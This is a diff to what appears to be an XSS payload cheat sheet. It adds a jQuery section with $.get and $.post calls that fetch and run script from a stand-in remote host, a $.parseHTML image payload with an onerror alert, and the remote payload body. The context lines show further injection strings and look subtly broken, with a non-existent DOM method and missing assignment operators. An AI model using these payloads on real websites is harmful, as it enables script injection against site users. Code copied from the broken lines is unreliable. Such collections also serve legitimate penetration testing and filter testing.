@@ -12,6 +12,17 @@ var variablename document.getElementByIdTagName("tagName").innerHTML = "-confirm
 var variablename document.getElementsByIdTagName("tagName")[0].innerHTML = "-confirm(1)-"
 ```
 
+### jQuery 2.1.1
+```
+$.get('http://example.com/jquerypayload')
+$.post('http://example.com/jquerypayload')
+$.parseHTML("<img src='​http://example.com/logo_jquery_215x53.gif'>")
+$.parseHTML("<img src='z' onerror='alert(\"xss\")'>")
+
+jquerypayload
+alert(document.domain);
+```
+
 ### Creating Requests
 ```
 var xhttp = new XMLHttpRequest();
